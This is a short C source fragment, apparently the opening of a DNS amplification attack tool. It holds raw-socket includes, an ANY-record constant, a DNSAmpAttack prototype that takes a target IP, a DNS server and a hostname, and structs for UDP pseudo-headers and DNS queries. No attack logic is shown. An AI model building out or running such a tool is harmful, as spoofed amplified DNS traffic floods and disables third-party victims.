#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h> // socket
#include <netinet/ip.h> // iphdr
#include <netinet/udp.h> // udphdr
#include <arpa/inet.h> // inet_addr
#include <unistd.h> // getpid

#define RECORD_ANY  0x00ff
#define DNS_PORT 53

void DNSAmpAttack(const char * target_ip, int target_port, const char * server_ip, const char * hostname);

typedef struct
{
    uint32_t ip_src;
    uint32_t ip_dst;
    uint8_t  zeroes;
    uint8_t  protocol;
    uint16_t ulen;
} ps_header;

typedef struct
{
    uint16_t id;    // arbitrary id
    uint16_t flags; // flags
    uint16_t qcount;// number of questions
    uint16_t answ;  // number of answers
    uint16_t auth;  // number of authority records
    uint16_t addi;  // number of additional records
} dns_header;

// I have no idea what this do
typedef struct
{
    uint16_t qtype; // question type
    uint16_t qclass;// question class
} question;
